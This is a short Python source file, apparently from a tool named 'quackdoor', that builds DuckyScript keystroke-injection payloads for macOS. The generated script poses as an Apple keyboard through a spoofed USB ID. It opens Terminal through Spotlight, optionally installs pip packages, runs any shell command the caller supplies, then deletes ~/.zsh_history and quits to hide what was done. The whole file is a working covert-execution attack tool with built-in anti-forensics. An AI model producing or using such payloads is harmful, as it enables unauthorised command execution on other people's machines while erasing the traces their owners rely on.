"""
builder.py

Provides a utility for generating DuckyScript payloads to automate the execution
of commands on macOS systems via simulated keyboard input.
"""

from typing import Iterable, Optional


def build_ducky_script(
    exec_command: str,
    pip_time: int = 1000,
    requirements: Optional[Iterable[str]] = None,
) -> str:
    """
    Generate a DuckyScript payload to execute commands in Terminal on macOS.

    This function returns a DuckyScript string that simulates keyboard input to:
        - Open Spotlight using GUI + SPACE
        - Launch Terminal.app
        - Navigate to the user's home directory
        - Optionally install Python packages using pip
        - Execute a specified shell command
        - Clear the terminal and remove shell history
        - Quit Terminal

    Args:
        exec_command (str): The main shell command to execute in Terminal.
        pip_time (int, optional): Delay after pip installation, in milliseconds.
                                  Defaults to 1000.
        requirements (List[Optional[str]], optional): List of pip package names to install
                                                      before executing the main command.

    Returns:
        str: A complete DuckyScript payload as a string.
    """
    pip_line = (
        f"STRING pip install {' '.join(requirements)}\nENTER\nDELAY {pip_time}\n"
        if requirements
        else ""
    )
    return f"""REM Auto-generated by quackdoor
ID 05ac:021e Apple:Keyboard
DELAY 300
GUI SPACE
DELAY 500
STRING terminal.app
DELAY 1000
ENTER
DELAY 1500
STRING cd ~
ENTER
DELAY 1000
{pip_line}STRING {exec_command}
ENTER
DELAY 2000
STRING clear
ENTER
DELAY 1000
STRING rm ~/.zsh_history
ENTER
DELAY 1000
GUI q
DELAY 250
"""
